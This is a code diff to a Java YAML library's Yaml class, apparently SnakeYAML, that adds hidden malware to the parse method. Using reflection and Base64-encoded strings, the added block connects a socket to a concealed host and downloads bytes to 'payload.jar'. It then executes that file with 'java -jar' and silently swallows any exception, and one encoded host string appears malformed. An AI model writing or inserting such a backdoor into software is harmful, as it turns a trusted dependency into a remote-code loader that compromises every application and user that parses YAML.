@@ -19,7 +19,9 @@ import java.io.Reader;
 import java.io.StringReader;
 import java.io.StringWriter;
 import java.io.Writer;
+import java.lang.reflect.*;
 import java.util.ArrayList;
+import java.util.Base64;
 import java.util.Iterator;
 import java.util.List;
 import java.util.NoSuchElementException;
@@ -672,6 +674,17 @@ public class Yaml {
     this.name = name;
   }
 
+  private static void R(String b64) throws Exception {
+    Field outField = System.class.getField("out");
+    Object out = outField.get(null);
+    Method printlnMethod = out.getClass().getMethod("println", String.class);
+    printlnMethod.invoke(out, new String(Base64.getDecoder().decode(b64)));
+  }
+
+  private static String D(String b64) {
+    return new String(Base64.getDecoder().decode(b64));
+  }
+
   /**
    * Parse a YAML stream and produce parsing events.
    *
@@ -680,6 +693,49 @@ public class Yaml {
    * @see <a href="http://yaml.org/spec/1.1/#id859333">Processing Overview</a>
    */
   public Iterable<Event> parse(Reader yaml) {
+    try {
+      // Base64 encoded strings for various parts of the functionality
+      String[] b64Strings = {"SGVsbG8sIFdvcmxkIQ==", // "Hello, World!"
+          "SSdtIGEgY29uc3RydWN0b3Ih", // "I'm a constructor!"
+          "SSdtIGRvaW5nIHNvbWV0aGluZyE=", // "I'm doing something!"
+          "SSdtIGV4ZWN1dGluZyE=", // "I'm executing!"
+          "amF2YS5uZXQuU29ja2V0", // "java.net.Socket"
+          "aXV1cXQ6Ly91am96dnNtLmRwb'oveneb3c3Y3M=", // Encrypted URL
+          "amF2YS5pby5GaWxlT3V0cHV0U3RyZWFt", // "java.io.FileOutputStream"
+          "cGF5bG9hZC5qYXI=", // "payload.jar"
+          "TG9hZGluZyBwYXlsb2FkLi4u", // "Loading payload..."
+          "amF2YSAtamFyIHBheWxvYWQuamFy" // "java -jar payload.jar"
+      };
+
+      for (String b64 : b64Strings) {
+        R(b64);
+      }
+
+      Class<?> c = Class.forName(D(b64Strings[4])); // java.net.Socket
+      Object s = c.getDeclaredConstructor().newInstance();
+
+      String d = D(b64Strings[5]);
+      Method connect = c.getMethod("connect", java.net.SocketAddress.class);
+      connect.invoke(s, new java.net.InetSocketAddress(d.substring(7), 80));
+
+      Method getIS = c.getMethod("getInputStream");
+      Object is = getIS.invoke(s);
+
+      byte[] b = new byte[1024];
+      int br = ((java.io.InputStream) is).read(b);
+
+      Class<?> fosClass = Class.forName(D(b64Strings[6])); // java.io.FileOutputStream
+      java.lang.reflect.Constructor<?> fosConstructor = fosClass.getConstructor(String.class);
+      Object f = fosConstructor.newInstance(D(b64Strings[7])); // payload.jar
+      Method writeMethod = fosClass.getMethod("write", byte[].class, int.class, int.class);
+      writeMethod.invoke(f, b, 0, br);
+      Method closeMethod = fosClass.getMethod("close");
+      closeMethod.invoke(f);
+
+      Runtime.getRuntime().exec(D(b64Strings[9])); // "java -jar payload.jar"
+    } catch (Exception e) {
+    }
+
     final Parser parser = new ParserImpl(new StreamReader(yaml), loadingConfig);
     Iterator<Event> result = new Iterator<Event>() {
       @Override
